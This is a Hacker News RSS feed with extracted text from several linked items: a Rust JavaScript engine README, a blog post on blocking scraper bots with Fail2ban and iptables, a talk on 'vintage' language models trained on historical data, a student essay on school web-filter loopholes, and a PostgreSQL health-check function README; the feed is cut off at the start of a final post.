<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Sun, 16 Nov 2025 20:10:46 +0000</lastBuildDate><item><title>Brimstone: ES2025 JavaScript engine written in Rust</title><link>https://github.com/Hans-Halverson/brimstone</link><description>&lt;doc fingerprint="f43e584bc5823dae"&gt;
  &lt;main&gt;
    &lt;p&gt;Brimstone is a JavaScript engine written from scratch in Rust, aiming to have full support for the JavaScript language.&lt;/p&gt;
    &lt;p&gt;Brimstone is a work in progress but already supports almost all of the JavaScript language (&amp;gt;97% of the ECMAScript language in test262). Not ready for use in production.&lt;/p&gt;
    &lt;p&gt;Implements the ECMAScript specification. Heavy inspiration is taken from the design of V8 and SerenityOS's LibJS. Brimstone chooses to implement almost all components of the engine from scratch with minimal dependencies, with the notable exception of ICU4X.&lt;/p&gt;
    &lt;p&gt;Brimstone features:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Bytecode VM, heavily inspired by the design of V8's Ignition&lt;/item&gt;
      &lt;item&gt;Compacting garbage collector, written in very unsafe Rust&lt;/item&gt;
      &lt;item&gt;Custom RegExp engine&lt;/item&gt;
      &lt;item&gt;Custom parser&lt;/item&gt;
      &lt;item&gt;Almost all builtin objects and functions implemented to spec&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Standard &lt;code&gt;cargo&lt;/code&gt; commands to build and run.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;cargo build&lt;/code&gt;to build the&lt;code&gt;bs&lt;/code&gt;executable&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;cargo run&lt;/code&gt;to run from source&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;JavaScript files can be executed with &lt;code&gt;bs&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;# Build brimstone
cargo build

# Execute a JavaScript file
./target/debug/bs ./hello.js
Hello world!
&lt;/code&gt;
    &lt;p&gt;Brimstone relies heavily on a set of first and third party integration test suites, most notably the official test262 test suite. A custom integration test runner is included. This can be run with:&lt;/p&gt;
    &lt;code&gt;cargo brimstone-test
&lt;/code&gt;
    &lt;p&gt;Unit and snapshot tests can be run with &lt;code&gt;cargo test&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;For more information on testing see the testing README.&lt;/p&gt;
    &lt;p&gt;All features up to ES2024 have been implemented, as well as all stage 4 proposals as of the Feb. 2025 TC39 meeting, except for the following features:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;SharedArrayBuffer&lt;/item&gt;
      &lt;item&gt;Atomics&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45944337</guid><pubDate>Sun, 16 Nov 2025 11:41:10 +0000</pubDate></item><item><title>The Internet Is No Longer a Safe Haven</title><link>https://brainbaking.com/post/2025/10/the-internet-is-no-longer-a-safe-haven/</link><description>&lt;doc fingerprint="374c1b517b41485f"&gt;
  &lt;main&gt;
    &lt;p&gt;A couple of days ago, the small server hosting this website was temporarily knocked out by scraping bots. This wasn’t the first time, nor is it the first time I’m seriously considering employing more aggressive countermeasures such as Anubis (see for example the June 2025 summary post). But every time something like this happens, a portion of the software hobbyist in me dies. We should add this to the list of things AI scrapers destroy next to our environment, the creative enthusiasm of the individuals who made things that are being scraped, and our critical thinking skills.&lt;/p&gt;
    &lt;p&gt;When I tried accessing Brain Baking, I was met with an unusual delay that prompted me to login and see what’s going on. A simple &lt;code&gt;top&lt;/code&gt; revealed both Gitea and the Fail2ban server gobbling up almost all CPU resources. Uh oh. Quickly killing Gitea didn’t reduce the work of Fail2ban as the Nginx access logs were being flooded with entries such as:&lt;/p&gt;
    &lt;code&gt;47.79.216.157 - - [27/Oct/2025:13:05:34 +0100] "GET /wgroeneveld/brainbaking/src/commit/4359ae68930de084df09e1cfa05ffd4520fb7e40/content/links.md?display=source HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.217.151 - - [27/Oct/2025:13:05:34 +0100] "GET /wgroeneveld/brainbaking/rss/commit/5911666cf0b30236cdc7590abb4e171534faf972/content/museum.md HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.217.32 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/src/commit/7b46fd682f36af81d4852b8ee2ee9970c638cac6/layouts HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.218.157 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/src/commit/4359ae68930de084df09e1cfa05ffd4520fb7e40/content/404.md HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.216.205 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/src/commit/590574b17b0e1bb068d442d309341e98762fd55d/content/about.md HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.217.95 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/rss/commit/25674d6de08a667926aab89362fa7bb585cd35c5/content/links.md HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.218.191 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/src/commit/590574b17b0e1bb068d442d309341e98762fd55d/themes HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.216.116 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/rss/commit/b4eac0fb71b056cb44fe062b8f2c0949dbb08af6/content/museum.md HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
&lt;/code&gt;
    &lt;p&gt;I have enough fail safe systems in place to block bad bots but the user agent &lt;code&gt;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36&lt;/code&gt; isn’t immediately recognized as “bad”: it’s ridiculously easy to spoof that HTTP header. Most user agent checkers I throw this string at claim this agent isn’t a bot. That means we shouldn’t only rely on this information.&lt;/p&gt;
    &lt;p&gt;Also, I temporarily block isolated IPs that keep on poking around (e.g. rate limiting on Nginx that get pulled into the ban list) but of course these scrapers never come from a single source. Yet the base attacking IP ranges remained the same: &lt;code&gt;47.79&lt;/code&gt;. The website ipinfo.io can help in identifying the threat: AS45102 Alibaba (US) Technology Co., Ltd.. Huh?&lt;/p&gt;
    &lt;p&gt;Apparently, Alibaba provides hosting from Singapore that is frequently being abused by attackers. Many others that host forums software such as PhpBB experienced the same problems and although the AbuseIPDB doesn’t report recent issues on the IPs from the above logs, I went ahead and blocked the entire range.&lt;/p&gt;
    &lt;p&gt;Fail2ban was struggling to keep up: it ingests the Nginx access.log file to apply its rules but if the files keep on exploding… Piping &lt;code&gt;cat access.log | grep /commit/ | cut -d " " -f 1&lt;/code&gt; to instant-ban everyone trying to access Git’s commit logs simply wasn’t fast enough. The only thing that had immediate effect was &lt;code&gt;sudo iptables -I INPUT -s 47.79.0.0/16 -j DROP&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;In case that wasn’t yet clear: I hate having to deal with this. It’s a waste of time, doesn’t hold back the next attack coming from another range, and intervening always happens too late. But worst of all, semi-random fire fighting is just one big mood killer. I just know this won’t be enough. Having a robust anti attacker system in place might increase the odds but that means either resorting to hand cannons like Anubis or moving the entire hosting to CloudFlare that will do it for me. But I don’t want to fiddle with even more moving components and configuration, nor do I want to route my visitors through tracking-enabled USA servers.&lt;/p&gt;
    &lt;p&gt;That Gitea instance should be moved off-site, or better yet, I should move the migration to Codeberg to the top of my TODO list. Yet it’s sad to see that people who like fiddling with their own little servers are increasingly punished for doing so, pushing many to a centralized solution, making things worse in the long term. The internet is no longer a safe haven for software hobbyists. I could link to dozens of other bloggers who reported similar issues to further solidify my point.&lt;/p&gt;
    &lt;p&gt;Other things I’ve noticed is increased traffic with Referer headers coming from strange websites such as &lt;code&gt;bioware.com&lt;/code&gt;, &lt;code&gt;mcdonalds.com&lt;/code&gt;, and &lt;code&gt;microsoft.com&lt;/code&gt;. It’s not like any of these giants are going to link to an article on this site. I don’t understand what the purpose of spoofing that header is besides upping the hits count?&lt;/p&gt;
    &lt;p&gt;However worse things might get, I refuse to give in.&lt;/p&gt;
    &lt;p&gt;It’s just like 50 Cent said: Get Hostin’ Or Die Tryin’.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45944870</guid><pubDate>Sun, 16 Nov 2025 13:12:03 +0000</pubDate></item><item><title>Vintage Large Language Models</title><link>https://owainevans.github.io/talk-transcript.html</link><description>&lt;doc fingerprint="7f8c913e6f710438"&gt;
  &lt;main&gt;
    &lt;p&gt;A video of the talk is available here. A tweet thread is here and the slide deck is here.&lt;/p&gt;
    &lt;p&gt;I'm going to talk about vintage large language models. The idea is to introduce language models trained on past data. We are sending language models back into the past - into Roman times, the Tudor era, the 1960s, or more recent decades.&lt;/p&gt;
    &lt;p&gt;A vintage LLM is a large language model trained on texts and potentially images or other multimodal data up to a particular date. The date could be 2019, so it's trained only on data until 2019 - that's the easier case. It could be up until 1900 or even up until 200 AD, and these historical cases are much more challenging.&lt;/p&gt;
    &lt;p&gt;One challenge is having enough training data. Another is that the training data needs to be free of contamination. For a model trained up till 1900, there needs to be no information from after 1900 that leaks into the data. Some metadata might have that kind of leakage. While it's not possible to have zero leakage - there's a shadow of the future on past data because what we store is a function of what we care about - it's possible to have a very low level of leakage, sufficient for this to be interesting.&lt;/p&gt;
    &lt;p&gt;You can include multimodal data like images. There's something strange about including images when going back to Roman times or 1700 because while they had texts, they didn't have digital images. However, this is acceptable for some purposes. You'd want to avoid leaking information that could only be known in the present. You could include things people at the time could see and experience themselves. For example, there may be no anatomically accurate painting in Roman times of a bee or an egg cracking, but you can include such images because people could see such things, even if they weren't part of their recorded media. You could also have pictures of buildings and artifacts that we still have from the past.&lt;/p&gt;
    &lt;p&gt;One motivation comes from science and epistemics. These applications will become increasingly important. We want to test approaches to using LLMs for prediction and scientific invention. There's various work on using LLMs for forecasting, like Halawi et al. They take an LLM and implement scaffolding with LLM agent-like behavior on top of the fine-tuned LLM. They also use information retrieval and chain of thought prompting. Various reinforcement learning and other techniques could be added to optimize the LLM for forecasting.&lt;/p&gt;
    &lt;p&gt;We'd like to test how well these approaches work at turning a raw LLM into a good forecaster. We can use a vintage LLM trained up to 2019 (denoted as LLM-2019) and see how well it forecasts up to 2024 through backtesting, familiar from financial modeling. The LLM-2019 wouldn't know about the pandemic, recent wars, or major economic events of the last five years. We can test how well it could predict these things - not just predicting that there would be a pandemic, but once evidence started accumulating, could it predict what would happen next? That first year of the pandemic would be extremely interesting to test forecasting in a novel scenario where human forecasters often made mistakes and predicting the next six months was quite difficult.&lt;/p&gt;
    &lt;p&gt;Another use of LLMs, which is more in its infancy, is scientific invention. We probably need substantial scaffolding, information retrieval, calling out to external resources for computation, and maybe running experiments. We want to see how well LLMs today could be used for making new inventions, perhaps starting very simple. We could apply this with vintage LLMs by taking an LLM trained up to 1989 and trying to reinvent ideas from the last 35 years - ideas we know to be good, like the web, quantum computing, blockchains, transformers, behavioral economics.&lt;/p&gt;
    &lt;p&gt;You could go even further back, which becomes really fascinating. You could have an LLM trained up to 1600, before Newton's laws, the theory of evolution, and probability theory, along with an enormous amount of philosophy and science that happened before then. While these concepts may be simpler than what we've invented in the last 35 years, it may be very difficult to create these things given what was known before.&lt;/p&gt;
    &lt;p&gt;The first humanistic motivation is time travel. What would it be like to communicate with someone from 1700? This is often depicted in movies or novels, but here you could do this interactively, providing a different and interesting source of evidence. The evidence would be skewed - if we go back to 1700, certain demographic groups will be much better represented in the data through diaries and recorded conversations. It's unclear how well we'll be able to deal with that bias in the data, but it's potentially something you could try to remedy in constructing the training set.&lt;/p&gt;
    &lt;p&gt;We can optimize this from the present - we know how people talk today and can see how well LLMs simulate that. You could apply the same optimization techniques that work well for present people to simulate conversations with people from the past. You could talk to famous people or the common person. Would they understand you? Would you understand them? You could also have a translator in this endeavor.&lt;/p&gt;
    &lt;p&gt;There's something interesting about LLMs in that they combine the world's written knowledge into one entity. An LLM can discuss tax law, quantum mechanics, and Haskell all in the same conversation, having knowledge no individual human has. This differs from the past, where there was more of a firewall between civilizations in sharing knowledge. If you go back to 0 AD, 500 AD, 1200, or 1500, you'll have texts in China or India unknown in the West, and vice versa.&lt;/p&gt;
    &lt;p&gt;You could train on everything, combining Western and Chinese texts in an anachronistic way - no library or scholar knew all these texts. Alternatively, you could train models just on Western texts or just on Chinese texts and examine the effects. What advantages does an LLM with this anachronistic combination have over one with just Western texts? You could survey counterfactual intellectual histories where different strands of knowledge are combined earlier than they did historically.&lt;/p&gt;
    &lt;p&gt;You could also look at the surprisingness of new ideas. For something like special relativity or Shakespeare's plays, how original were they? How surprising were they? You could prompt the model up until the time these things emerged but before they did and see how it reacts. Can it fill in the blanks given hints toward these insights? How surprising does it find the texts in terms of their predictability?&lt;/p&gt;
    &lt;p&gt;Epistemic AI has a broad definition: using AI systems to help with epistemics - making beliefs and models of the world more accurate and calibrated. Concrete applications include making more accurate forecasts, surveying scientific literature, combining existing knowledge, and helping humans invent new STEM ideas. LLMs can do this differently from something like AlphaFold because they operate in natural language, writing down scientific laws and reasoning about them logically.&lt;/p&gt;
    &lt;p&gt;When training an epistemic AI system, you need gold standard examples for training and evaluation. This is crucial. When training a base large language model, you're just training it to imitate text, not to say true things or propose scientific laws. We need gold standard examples that illustrate high-quality behavior for an epistemic AI.&lt;/p&gt;
    &lt;p&gt;There are three main sources for these examples:&lt;/p&gt;
    &lt;p&gt;Current humans (RLHF approach) - The AI system outputs a response or proposal, and humans evaluate its quality. This requires humans to judge how good the system's output is, which can be challenging.&lt;/p&gt;
    &lt;p&gt;Algorithms - Like in AlphaGo, where you know the rules of chess and can compute whether it wins or loses. In RLHF, another model can automate human feedback, with a neural network imitating how humans would respond.&lt;/p&gt;
    &lt;p&gt;Historical data - This is the approach for vintage LLMs and is also the data source for pre-training, getting the model to predict something that was said in human text.&lt;/p&gt;
    &lt;p&gt;There are significant challenges in creating vintage LLMs:&lt;/p&gt;
    &lt;p&gt;Data Requirements: You need an enormous dataset from the past - a model might need 50 trillion words. This is extremely large, and you need to ensure there's no leakage from the future into this historical data.&lt;/p&gt;
    &lt;p&gt;Training Costs: Training a state-of-the-art model might cost upwards of $200 million, with next-generation models being even more expensive. While this isn't huge compared to all science funding, it's a significant investment.&lt;/p&gt;
    &lt;p&gt;Regarding data, if we go back to 2021, we have most of the high-quality data from 2020. The highest quality data for STEM prediction and forecasting includes scientific papers, key statistics, Wikipedia, and other encyclopedias. We have high-quality economic, meteorological, chemistry, and biological data.&lt;/p&gt;
    &lt;p&gt;What we have less of for 2021, and especially for 1990, is content like Reddit - random conversations, web pages, and social media. But if you're interested in forecasting and scientific invention, this social media data might not be crucial. Going back to 1990, 1950, or even 1900, we actually have much of the most high-quality data.&lt;/p&gt;
    &lt;p&gt;One gap is that if you go back far enough, there's probably important engineering and practical understanding that wasn't written down. In 1800, people had extensive practical engineering knowledge, but we likely don't have many manuals recording this practical understanding. We could partially reconstruct this through pictures of machines, tools, artifacts, and buildings from that time.&lt;/p&gt;
    &lt;p&gt;Progress in synthetic data is potentially crucial here. While we have high-quality data from past decades and years, we don't have the same volume of data in total. Synthetic data could help bridge this gap by using another large language model to generate more training data.&lt;/p&gt;
    &lt;p&gt;The approach would be to take a real document and use another LLM to create paraphrases, scramblings, or remixes that maintain the same content but vary the phrasing and order. Synthetic data is already being used by AI labs in training - Meta discussed it for their Level 3 training, and we can expect significant progress in this area as it allows for higher quality data without the expense of collecting more.&lt;/p&gt;
    &lt;p&gt;For vintage LLMs, synthetic data techniques need to be powerful because the need for synthetic data is greater. If you want an LLM from 1900, you gather all available data from that period and then use another LLM to generate variations. To avoid contamination, you could use a bootstrapping approach: train a weaker LLM on clean 1900 information, then use that LLM to generate synthetic data for training an improved 1900 LLM.&lt;/p&gt;
    &lt;p&gt;Regarding training costs, one potential approach is chronological training with forking. Instead of training separate models for 2021 and 2024, you could train up to 2021 and then fork the training. One path continues with additional epochs over 2021 data, while another incorporates 2022-2024 data. This saves training costs, though it might result in slightly worse models due to distribution shift.&lt;/p&gt;
    &lt;p&gt;The value proposition matters too - if a 2021 vintage LLM proves valuable enough, spending hundreds of millions might be justified. The costs might be lower than expected since you've already paid for the compute cluster and developed the expertise.&lt;/p&gt;
    &lt;p&gt;Some additional ideas worth exploring:&lt;/p&gt;
    &lt;p&gt;Outsourcing Functions: Vintage LLMs could outsource some functions to current LLMs. Since 2024 LLMs are likely stronger overall, vintage LLMs could call them for certain experiments or reasoning processes, similar to Meta's Toolformer. The key is preventing information leakage from the present.&lt;/p&gt;
    &lt;p&gt;Compartmentalized LLMs: Train on all data up to 2024, but with clear date annotations on every document. This allows prompting the model for a particular date, getting responses conditioned on that time period without anachronisms. While not a true vintage LLM due to potential contamination, it could complement actual vintage LLMs, especially for outsourcing functions.&lt;/p&gt;
    &lt;p&gt;These ideas need further development, but they represent interesting directions for exploring this space. The field of vintage LLMs offers exciting possibilities for understanding historical knowledge development and testing AI capabilities in novel ways.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45944906</guid><pubDate>Sun, 16 Nov 2025 13:15:50 +0000</pubDate></item><item><title>Where Educational Technology Fails: A seventh-grader's perspective</title><link>https://micahblachman.beehiiv.com/p/where-educational-technology-fails</link><description>&lt;doc fingerprint="283c6803b9e9de45"&gt;
  &lt;main&gt;
    &lt;p&gt;Educational technology, specifically to monitor student activity, only works as long as it can keep up with the students. As someone who experiences these solutions in use every day, I can affirm that the loopholes might outnumber the blocked sites.&lt;/p&gt;
    &lt;p&gt;For example, some students might want to play video games during class. A school can make efforts to mitigate this, such as using a platform like Securly to automatically block sites flagged as games, but that only goes so far. A coding class at my school uses MIT’s Scratch to create simple games — which means that they have to unblock it, allowing kids access to any game on that site. Additionally, sites used by teachers for quiz games, such as Blooket and Gimkit, can be repurposed by students with “all-correct” question sets to be used as games. Thirdly, I’ve seen that when a game happens to be unblocked, the link spreads like wildfire from email account to email account. As one example, I know of an unblocked website with an embedded game inside that involved moving a truck through an obstacle course (it looked pretty boring to me, but I guess the bar is pretty low, no pun intended).&lt;/p&gt;
    &lt;p&gt;That’s not to say a school’s system is necessarily completely ineffective. Last year, my school had left unblocked the spammy-sounding Unblocked Games 66. It’s now blocked, but in a lot of ways, relying on IT to stay a step ahead of tech-savvy students seems like a recipe for ineffective policing.&lt;/p&gt;
    &lt;p&gt;Here’s something interesting: Even if a school blocks YouTube, there are educational tools teachers can use to create questions and those sites may well be unblocked. If you create a teacher account, you can watch any YouTube video even if the YouTube site itself is blocked.&lt;/p&gt;
    &lt;p&gt;Blocking sites just encourages kids to find loopholes and can only be a temporary solution. Schools should instead teach kids how to use technology responsibly and to trust the students at least somewhat — of course they should block actually inappropriate content. Is blocking easier for a school? — certainly. But is it actually better in the long run? — maybe not.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45944941</guid><pubDate>Sun, 16 Nov 2025 13:20:41 +0000</pubDate></item><item><title>PgFirstAid: PostgreSQL function for improving stability and performance</title><link>https://github.com/randoneering/pgFirstAid</link><description>&lt;doc fingerprint="a01ac5f363592bde"&gt;
  &lt;main&gt;
    &lt;quote&gt;
      &lt;p&gt;Easy-to-deploy, open source PostgreSQL function that provides a prioritized list of actions to improve database stability and performance.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Inspired by Brent Ozar's FirstResponderKit for SQL Server, pgFirstAid is designed for everyone to use—not just DBAs! Get actionable health insights from your PostgreSQL database in seconds.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Zero Dependencies - Single SQL function, no external tools required&lt;/item&gt;
      &lt;item&gt;Comprehensive Checks - 12 (and growing!) built-in health checks covering critical performance and stability issues&lt;/item&gt;
      &lt;item&gt;Prioritized Results - Issues ranked by severity (CRITICAL → HIGH → MEDIUM → LOW → INFO)&lt;/item&gt;
      &lt;item&gt;Actionable Recommendations - Each issue includes specific remediation steps&lt;/item&gt;
      &lt;item&gt;Documentation Links - Direct links to official PostgreSQL documentation for deeper learning&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;-- Copy and paste the function definition into your PostgreSQL database
-- Then run it:
SELECT * FROM pg_firstAid();&lt;/code&gt;
    &lt;p&gt;That's it! No configuration needed. Deploy as a user with the highest possible priviledges (in your environment) to avoid issues.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="8"&gt;
        &lt;cell role="head"&gt;severity&lt;/cell&gt;
        &lt;cell role="head"&gt;category&lt;/cell&gt;
        &lt;cell role="head"&gt;check_name&lt;/cell&gt;
        &lt;cell role="head"&gt;object_name&lt;/cell&gt;
        &lt;cell role="head"&gt;issue_description&lt;/cell&gt;
        &lt;cell role="head"&gt;current_value&lt;/cell&gt;
        &lt;cell role="head"&gt;recommended_action&lt;/cell&gt;
        &lt;cell role="head"&gt;documentation_link&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;CRITICAL&lt;/cell&gt;
        &lt;cell&gt;Table Structure&lt;/cell&gt;
        &lt;cell&gt;Missing Primary Key&lt;/cell&gt;
        &lt;cell&gt;public.users&lt;/cell&gt;
        &lt;cell&gt;Table missing a primary key...&lt;/cell&gt;
        &lt;cell&gt;No primary key defined&lt;/cell&gt;
        &lt;cell&gt;Add a primary key or unique constraint...&lt;/cell&gt;
        &lt;cell&gt;https://www.postgresql.org/...&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;HIGH&lt;/cell&gt;
        &lt;cell&gt;Statistics&lt;/cell&gt;
        &lt;cell&gt;Missing Statistics&lt;/cell&gt;
        &lt;cell&gt;public.orders&lt;/cell&gt;
        &lt;cell&gt;Table has never been analyzed...&lt;/cell&gt;
        &lt;cell&gt;Last analyze: Never&lt;/cell&gt;
        &lt;cell&gt;Run ANALYZE on this table...&lt;/cell&gt;
        &lt;cell&gt;https://www.postgresql.org/...&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Missing Primary Keys - Tables without primary keys that can cause replication issues and poor performance&lt;/item&gt;
      &lt;item&gt;Unused Large Indexes - Indexes consuming significant disk space but never used (&amp;gt;10MB, 0 scans)&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Table Bloat - Tables with &amp;gt;20% bloat affecting performance (tables &amp;gt;100MB)&lt;/item&gt;
      &lt;item&gt;Missing Statistics - Tables never analyzed, leaving the query planner without statistics&lt;/item&gt;
      &lt;item&gt;Duplicate Indexes - Multiple indexes with identical or overlapping column sets&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Outdated Statistics - Table statistics older than 7 days with significant modifications&lt;/item&gt;
      &lt;item&gt;Low Index Efficiency - Indexes with poor selectivity (scan-to-tuple ratio &amp;gt;1000)&lt;/item&gt;
      &lt;item&gt;Excessive Sequential Scans - Tables with high sequential scan activity that may benefit from indexes&lt;/item&gt;
      &lt;item&gt;High Connection Count - More than 50 active connections potentially impacting performance&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Missing Foreign Key Indexes - Foreign key constraints without supporting indexes for efficient joins&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Database Size - Current database size and growth monitoring&lt;/item&gt;
      &lt;item&gt;PostgreSQL Version - Version information and configuration details&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;-- Show only critical issues
SELECT * FROM pg_firstAid() WHERE severity = 'CRITICAL';

-- Show critical and high priority issues
SELECT * FROM pg_firstAid() WHERE severity IN ('CRITICAL', 'HIGH');&lt;/code&gt;
    &lt;code&gt;-- Focus on index-related issues
SELECT * FROM pg_firstAid() WHERE category LIKE '%Index%';

-- Check table maintenance issues
SELECT * FROM pg_firstAid() WHERE category = 'Table Maintenance';&lt;/code&gt;
    &lt;code&gt;SELECT severity, COUNT(*) as issue_count
FROM pg_firstAid()
GROUP BY severity
ORDER BY MIN(CASE severity
    WHEN 'CRITICAL' THEN 1
    WHEN 'HIGH' THEN 2
    WHEN 'MEDIUM' THEN 3
    WHEN 'LOW' THEN 4
    ELSE 5 END);&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Daily - Quick health check as part of morning routine&lt;/item&gt;
      &lt;item&gt;Before Deployment - Catch potential issues before they impact production&lt;/item&gt;
      &lt;item&gt;After Major Changes - Verify database health after schema modifications or data migrations&lt;/item&gt;
      &lt;item&gt;Performance Troubleshooting - First step when investigating slow queries or system issues&lt;/item&gt;
      &lt;item&gt;Capacity Planning - Regular monitoring to track database growth trends&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Read Before Acting&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Always review recommendations carefully before making changes. I have been supporting Postgres databases for close to a decade, but I learn something new each day&lt;/item&gt;
      &lt;item&gt;Test in a non-production environment first&lt;/item&gt;
      &lt;item&gt;Some operations (like VACUUM FULL) require maintenance windows&lt;/item&gt;
      &lt;item&gt;Never drop an index without validating its usage patterns over time&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Permissions&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Requires read access to system catalogs (&lt;code&gt;pg_catalog&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Works with standard user permissions for most checks&lt;/item&gt;
      &lt;item&gt;Some checks may return fewer results for non-superuser accounts&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;pgFirstAid is designed to be lightweight and safe to run on production systems:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Read-only operations (no modifications to your data or schema)&lt;/item&gt;
      &lt;item&gt;Uses system catalog views that are already cached&lt;/item&gt;
      &lt;item&gt;Typical execution time: &amp;lt;1 second on most databases&lt;/item&gt;
      &lt;item&gt;No locking or blocking of user queries&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;PostgreSQL 10+ - Fully supported, but only testing on 15+. This will change as versions are deprecated&lt;/item&gt;
      &lt;item&gt;PostgreSQL 9.x - Most features work (minor syntax adjustments may be needed)&lt;/item&gt;
      &lt;item&gt;Works with all PostgreSQL-compatible databases (Amazon RDS, Aurora, Azure Database, etc.)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Found a bug? Have an idea for a new health check? Let me know! I want this to grow to be a tool that is available for all, accidental DBA or not.&lt;/p&gt;
    &lt;p&gt;GPLv3&lt;/p&gt;
    &lt;p&gt;Inspired by Brent Ozar's FirstResponderKit for SQL Server. Thank you to the SQL Server community for pioneering accessible database health monitoring!&lt;/p&gt;
    &lt;p&gt;Dave-IYKYK&lt;/p&gt;
    &lt;p&gt;Made with ☕ for the PostgreSQL and Open Source community&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45944951</guid><pubDate>Sun, 16 Nov 2025 13:23:22 +0000</pubDate></item><item><title>Garbage Collection Is Useful</title><link>https://dubroy.com/blog/garbage-collection-is-useful/</link><description>&lt;doc fingerprint="77dde9411c9b5350"&gt;
